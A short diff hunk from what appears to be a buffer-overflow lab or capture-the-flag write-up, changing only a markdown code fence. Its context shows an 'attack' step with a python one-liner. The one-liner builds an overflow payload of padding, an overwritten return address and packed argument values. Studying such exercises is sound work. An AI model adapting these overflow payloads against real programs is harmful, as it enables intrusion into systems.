@@ -191,7 +191,7 @@ The location of of `p` and `q` is: ` 100 + 4 (blank) + \x1b\x85\x04\x08 (ret) + 
 4. Conducting an attack:
 ```bash
 echo $(python -c "print('a'*104 + '\x1b\x85\x04\x08' + 'b'*4 + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")
-```bash 
+```
 
 
 
